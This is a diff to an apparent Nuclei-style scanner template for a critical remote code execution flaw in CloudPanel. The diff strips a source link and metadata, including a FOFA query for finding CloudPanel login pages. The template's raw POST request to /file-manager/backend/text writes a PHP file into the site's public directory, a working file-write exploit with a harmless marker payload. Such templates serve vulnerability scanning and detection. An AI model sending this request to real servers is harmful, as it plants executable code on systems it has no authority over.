@@ -3,12 +3,8 @@ info:
   name: CloudPanel text接口存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/do3nq1m1wn7q9dgp'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: do3nq1m1wn7q9dgp
-    fofa: title=="CloudPanel | Log In"
 http:
 - raw:
   - 'POST /file-manager/backend/text HTTP/1.1
@@ -27,8 +23,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     id=/htdocs/app/files/public/dudesite.php&content=<?php echo ''dudesite'';?>
